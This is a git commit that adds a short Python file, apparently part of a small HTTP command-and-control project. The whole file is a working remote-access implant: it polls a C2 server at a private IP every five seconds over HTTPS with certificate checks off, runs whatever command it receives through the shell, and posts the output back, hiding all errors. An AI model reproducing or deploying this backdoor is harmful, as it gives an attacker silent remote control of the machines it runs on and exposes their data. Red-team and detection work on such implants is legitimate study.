e690d28ca01cac2ae2f733d29c6e48a52aead217
madhavbhatt <madhav.bhatt73@gmail.com>
2019-08-18 07:17:08 -0700

    http-c2

---
+++ http-c2/http_c2_payload.py
@@ -0,0 +1,18 @@
+import os, ssl, time, http.client
+
+def callback():
+    try:
+        # change 172.16.69.132 with IP of your c2 server
+        c2_connection = http.client.HTTPSConnection('172.16.69.132', timeout=10, context=ssl._create_unverified_context())
+        c2_connection.request("GET", "/")
+        cmd = c2_connection.getresponse().read().decode()
+        if cmd:
+            results = (os.popen(str(cmd)).read())
+            c2_connection.request("POST", "", results)
+            c2_connection.close()
+    except:
+        pass
+
+while 1:
+    callback()
+    time.sleep(5)
